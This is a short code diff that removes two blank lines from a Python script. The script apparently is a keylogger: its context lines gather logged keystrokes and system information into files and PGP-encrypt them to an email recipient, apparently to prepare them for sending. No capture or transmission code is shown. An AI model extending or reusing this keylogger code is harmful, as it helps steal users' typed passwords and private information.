@@ -193,7 +193,6 @@ while currentTime < endTime:
 # PGP encryption
 
 # encrypt files
-
 def encryptions(key, name, email, system, keylogger):
     systemfiles_to_encrypt = [extendedPath + systemInfo]
     keyloggerfiles_to_encrypt = [extendedPath + loggedKeys]
@@ -269,7 +268,6 @@ def encrypt_gnupg(email, key, file_to_encrypt, encrypted_file):
             f, recipients=[email],
             output=encrypted_file + '.gpg')
     return encrypted_file
-
 
 # Fernet Encryption - May be implemented later
 # def fernetEncrypt():
